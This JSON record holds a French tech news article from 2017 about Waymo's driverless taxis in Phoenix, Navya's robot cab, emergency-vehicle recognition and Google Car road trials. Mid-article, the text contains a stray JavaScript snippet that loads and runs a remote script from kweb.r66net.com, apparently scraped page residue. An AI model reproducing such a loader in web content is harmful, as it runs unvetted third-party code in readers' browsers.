{"title": "Voiture autonome : Google tente une premiere mondiale", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-07-26", "content": "Waymo, la filiale d'Alphabet (Google), vient d'annoncer le lancement d'un service de taxi assure par ses voitures autonomes. Ces dernieres circuleront toutes seules. Aucun chauffeur humain ne sera la pour reprendre le controle en cas de probleme. Google  prend une longueur d'avance dans le deploiement commercial de voitures totalement autonomes.  Waymo , la filiale d'Alphabet (la maison mere de Google), vient d'annoncer qu'elle realisait des trajets avec ses taxis autonomes sans chauffeur de securite derriere le volant depuis le mois dernier. Cela se passe dans la ville de Phoenix, en Arizona, et il s'agit d'une premiere. Waymo va poursuivre cette experimentation dans les mois qui viennent en l'ouvrant au grand public. Dans un premier temps, ce service de taxi robotise sera accessible aux personnes inscrites au programme pilote initie par Waymo. Pour commencer, les trajets se feront avec la presence d'un employe de l'entreprise, qui se tiendra sur un siege arriere de l'un des monospaces Chrysler Pacifica qui compose la flotte de taxis autonomes.  Cette video tournee par Waymo montre les taxis autonomes realiser des transports de passagers sans aucun chauffeur de securite derriere le volant. (c) Waymo Le Francais Navya concurrence Waymo avec son taxi autonome Dans son communique,  Waymo  rappelle que le projet de voiture autonome de Google a debute en 2009 et que, depuis cette date, plus de 5,6 millions de kilometres ont ete parcourus sur des routes publiques a travers 20 villes americaines. Une experience completee par des essais sur un circuit prive et des simulations informatiques durant lesquelles des logiciels parcourent l'equivalent de 16 millions de kilometres chaque jour. Ces chiffres sont la pour rassurer quant au niveau de securite atteint par les  voitures autonomes de Google .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais le geant californien n'est pas le seul a avancer aussi vite. Coincidence (ou pas ?), la societe lyonnaise  Navya  a devoile le meme jour que Waymo le << premier cab robotise de serie >>. Baptise  Autonom Cab , il s'agit d'un taxi electrique totalement autonome, depourvu de poste de pilotage. Il pourra transporter jusqu'a six passagers sur des trajets intra-urbains en leur offrant divers services connectes. Il sera commercialise a partir du troisieme trimestre 2018 pour un tarif oscillant entre 230.000 et 250.000 euros. Pour en savoir plus La voiture autonome de Google apprend a reconnaitre les vehicules d'urgence Article initial de Marc Zaffagni, paru le 26/07/2017 Waymo, la filiale d'Alphabet (maison-mere de Google) dediee aux  voitures autonomes , travaille a integrer dans son  intelligence artificielle  (IA) la reconnaissance des vehicules d'urgence (ambulance, police, pompiers...) afin d'adopter la conduite adequate. Apres avoir appris a reconnaitre  << les cyclistes en tant qu'usagers de la route a part entiere >> , les voitures autonomes de  Google  s'entrainent desormais a reagir de facon appropriee en presence de vehicules d'urgence : voitures et  motos  de police, camions de pompiers, ambulances. Recemment,  Waymo , la filiale d'Alphabet (maison-mere de Google) en charge du programme de voitures autonomes, a realise une journee de test en collaboration avec les services de police et les pompiers de la ville de Chandler, en Arizona (Etats-Unis). Les nouveaux monospaces autonomes  Chrysler Pacifica Hybrid  avec lesquels Waymo travaille a present sont equipes de nouveaux  capteurs  audio. Ceux-ci leur permettent de detecter les sons et  lumieres  emis a une distance plus importante qu'avant. Les voitures autonomes reconnaissent les sirenes Ces informations sont analysees par l'intelligence artificielle du systeme qui determine la provenance du signal sonore et l'identifie. Pour cela, les voitures de Waymo ont collecte une bibliotheque d'echantillons des differentes sirenes utilisees par les vehicules d'urgence evoluant a differentes  vitesses , distances et approchant sous divers angles. Waymo explique que ses  voitures autonomes  sont capables de se ranger sur le bas-cote si elles detectent un vehicule d'urgence arrivant derriere elles ou bien de ceder le passage a une intersection. <<  Nous pouvons reconnaitre un vehicule d'urgence meme si nous ne l'avons jamais rencontre auparavant  >>, assure l'entreprise. La voiture autonome de Google peut prendre la route Article initial de Numerama, paru le 19/05/2015 Google vient d'etre autorise a faire circuler son prototype de voiture sans chauffeur, aussi appele Google Car, sur des routes ouvertes. Cette experimentation en conditions reelles debutera cet ete dans les rues, aux abords du siege de l'entreprise en Californie. C'est une etape tres importante pour le projet de voiture automatique initie par  Google . L'entreprise americaine a obtenu le  feu vert  des autorites californiennes pour faire circuler des cet ete ses propres prototypes sur la voie publique. Jusqu'a present, l'autorisation obtenue par la firme de Mountain View se limitait a quelques  voitures  modifiees de marque  Toyota  et Lexus. Le modele qui fera son apparition sur les routes californiennes dans quelques semaines a ete devoile il y a maintenant un an. Il s'agit d'une petite  automobile electrique  pouvant accueillir deux personnes a bord. Pour des raisons de securite, la vitesse maximale sera plafonnee a 40 km/h afin de limiter les degats en cas de sortie de route ou de collision avec un obstacle quelconque. Les voitures autonomes testees jusque-la par Google etaient des Toyota ou des Lexus. Le prototype n'etait pas encore sur les routes. (c) Google                               Mise en circulation vers 2020 Par ailleurs, meme s'il s'agit d'une  voiture automatique  censee etre capable de se diriger toute seule, le passager assis a la place du conducteur pourra a tout moment reprendre la main sur le vehicule. Celui-ci sera en effet equipe d'un volant et de pedales. Ces mecanismes etaient exiges par les autorites californiennes pour passer a la phase d'experimentation sur la voie publique. Avec l'arrivee imminente de ce prototype sur les routes, Google va pouvoir amasser de nouvelles informations pour ameliorer le systeme de bord dedie a la  conduite automatique . On pense surtout aux evenements ponctuels et imprevus (travaux, ralentissements, deviations, traversee de pietons, comportement des autres conducteurs), qui obligeront le vehicule a ajuster sa trajectoire et sa vitesse.  Google  souhaite faire circuler ses  voitures  d'ici cinq ans. C'est un objectif qui a ete annonce lors du salon de l' automobile  a Detroit en debut d'annee, puis reaffirme quelques semaines plus tard lors d'une conference TED a Vancouver. La voiture autonome de Google testee sur la voie publique                       On devrait bientot pouvoir croiser la Google Car sur les routes californiennes. En effet, ce petit vehicule autonome et electrique a recu l'approbation de rouler en ville. La voici en video sur les routes de Mountain View, pres du siege de Google.                                       ", "theme": "tech"}